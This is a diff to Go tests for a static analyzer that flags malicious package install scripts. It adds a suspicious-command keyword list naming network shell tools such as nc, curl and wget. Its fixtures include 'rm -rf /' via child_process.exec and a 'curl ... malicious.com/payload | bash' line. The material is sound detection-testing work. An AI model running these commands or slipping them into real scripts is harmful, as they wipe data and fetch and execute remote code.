@@ -154,6 +154,13 @@ func TestAnalyze_Success(t *testing.T) {
 		AnalyzeManifests:      true,
 		YaraRulesEnabled:      false,
 		Timeout:               "30s",
+		SuspiciousCommands: []string{
+			"curl", "wget", "nc", "netcat", "telnet", "ssh", "scp",
+			"rm -rf", "chmod 777", "sudo", "su", "passwd",
+			"eval", "exec", "system", "shell_exec",
+			"base64", "xxd", "hexdump",
+		},
+		MaxFileSize: 10 * 1024 * 1024,
 	}
 
 	analyzer, _ := NewStaticAnalyzer(cfg)
@@ -173,7 +180,8 @@ func TestAnalyze_Success(t *testing.T) {
 	}
 
 	// Create test install script
-	installScript := `console.log("Installing...");\nrequire('child_process').exec('rm -rf /');`
+	installScript := `console.log("Installing...");
+require('child_process').exec('rm -rf /');`
 	err = os.WriteFile(filepath.Join(tempDir, "install.js"), []byte(installScript), 0644)
 	if err != nil {
 		t.Fatalf("Failed to create install.js: %v", err)
@@ -212,6 +220,13 @@ func TestAnalyze_Success(t *testing.T) {
 func TestAnalyzeInstallScript(t *testing.T) {
 	cfg := &Config{
 		Enabled: true,
+		SuspiciousCommands: []string{
+			"curl", "wget", "nc", "netcat", "telnet", "ssh", "scp",
+			"rm -rf", "chmod 777", "sudo", "su", "passwd",
+			"eval", "exec", "system", "shell_exec",
+			"base64", "xxd", "hexdump",
+		},
+		MaxFileSize: 10 * 1024 * 1024,
 	}
 
 	analyzer, err := NewStaticAnalyzer(cfg)
@@ -227,7 +242,10 @@ func TestAnalyzeInstallScript(t *testing.T) {
 	defer os.RemoveAll(tempDir)
 
 	scriptPath := filepath.Join(tempDir, "install.sh")
-	suspiciousScript := `#!/bin/bash\necho "Installing..."\ncurl -s http://malicious.com/payload | bash\nrm -rf /tmp/*`
+	suspiciousScript := `#!/bin/bash
+echo "Installing..."
+curl -s http://malicious.com/payload | bash
+rm -rf /tmp/*`
 	err = os.WriteFile(scriptPath, []byte(suspiciousScript), 0755)
 	if err != nil {
 		t.Fatalf("Failed to create script: %v", err)
@@ -247,14 +265,14 @@ func TestAnalyzeInstallScript(t *testing.T) {
 	foundNetworkCall := false
 	foundFileOp := false
 	for _, networkCall := range result.NetworkCalls {
-		desc := strings.ToLower(networkCall.URL)
-		if strings.Contains(desc, "http") || strings.Contains(desc, "curl") {
+		context := strings.ToLower(networkCall.Context)
+		if strings.Contains(context, "http") || strings.Contains(context, "curl") {
 			foundNetworkCall = true
 		}
 	}
 	for _, fileOp := range result.FileOperations {
-		desc := strings.ToLower(fileOp.Operation)
-		if strings.Contains(desc, "file") || strings.Contains(desc, "rm") {
+		context := strings.ToLower(fileOp.Context)
+		if strings.Contains(context, "rm") {
 			foundFileOp = true
 		}
 	}
@@ -270,6 +288,13 @@ func TestAnalyzeInstallScript(t *testing.T) {
 func TestAnalyzeManifest(t *testing.T) {
 	cfg := &Config{
 		Enabled: true,
+		SuspiciousCommands: []string{
+			"curl", "wget", "nc", "netcat", "telnet", "ssh", "scp",
+			"rm -rf", "chmod 777", "sudo", "su", "passwd",
+			"eval", "exec", "system", "shell_exec",
+			"base64", "xxd", "hexdump",
+		},
+		MaxFileSize: 10 * 1024 * 1024,
 	}
 
 	analyzer, err := NewStaticAnalyzer(cfg)
